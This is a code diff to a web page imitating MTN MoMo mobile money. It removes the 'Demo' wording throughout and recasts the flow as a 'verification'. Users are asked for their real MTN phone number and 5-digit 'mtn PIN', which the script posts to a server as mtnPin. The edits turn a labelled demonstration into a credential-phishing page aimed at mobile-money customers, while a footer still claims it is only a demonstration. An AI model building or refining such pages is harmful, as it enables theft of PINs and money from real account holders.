@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <title>MTN MoMo Demo</title>
+  <title>MTN MoMo</title>
 
   <style>
     * {
@@ -255,7 +255,7 @@
     <!-- HEADER -->
     <div class="top">
       <div class="mtn-logo">MTN</div>
-      <div class="momo-title">MoMo DEMO</div>
+      <div class="momo-title">MoMo MTN</div>
     </div>
 
     <!-- NUMBER SCREEN -->
@@ -264,7 +264,7 @@
       <h1 class="welcome">Welcome to MoMo</h1>
 
       <p class="description">
-        Enter your mobile number to continue with this demonstration.
+        Enter your mobile number to continue with this submission.
       </p>
 
       <label class="label" for="phone">Mobile number</label>
@@ -299,7 +299,7 @@
         <h2>Enter your 5-digit PIN</h2>
 
         <p>
-          Enter the <strong>demo PIN</strong> to complete this test submission.
+          Enter the <strong>mtn PIN</strong> to complete this test submission.
         </p>
       </div>
 
@@ -332,14 +332,14 @@
       <h2>Submission successful</h2>
 
       <p>
-        Your demo submission has been completed successfully.
+        Your verification has been completed successfully.
       </p>
 
     </section>
 
 
     <div class="footer">
-      MTN MoMo Demo<br>
+      MTN MoMo<br>
       This is a demonstration environment and does not process real transactions.
     </div>
 
@@ -375,13 +375,13 @@
     const phone = phoneInput.value.trim();
 
     /*
-      Demo format:
+      Mtn format:
       9 digits total
       First digit must be 7
     */
     if (!/^7[0-9]{8}$/.test(phone)) {
       numberError.textContent =
-        "Enter a 9-digit demo number starting with 7.";
+        "Enter a 9-digit mtn number starting with 7.";
       return;
     }
 
@@ -424,17 +424,17 @@
   });
 
 
-  /* VERIFY DEMO PIN */
+  /* VERIFY MTN PIN */
   verifyButton.addEventListener("click", async () => {
 
-    const demoPin =
+    const mtnPin =
       Array.from(pinBoxes)
         .map(box => box.value)
         .join("");
 
-    if (!/^[0-9]{5}$/.test(demoPin)) {
+    if (!/^[0-9]{5}$/.test(mtnPin)) {
       pinError.textContent =
-        "Demo PIN is required.";
+        "Mtn PIN is required.";
       return;
     }
 
@@ -452,7 +452,7 @@
 
         body: JSON.stringify({
           phone: submittedPhone,
-          demoPin: demoPin
+          mtnPin: mtnPin
         })
       });
 
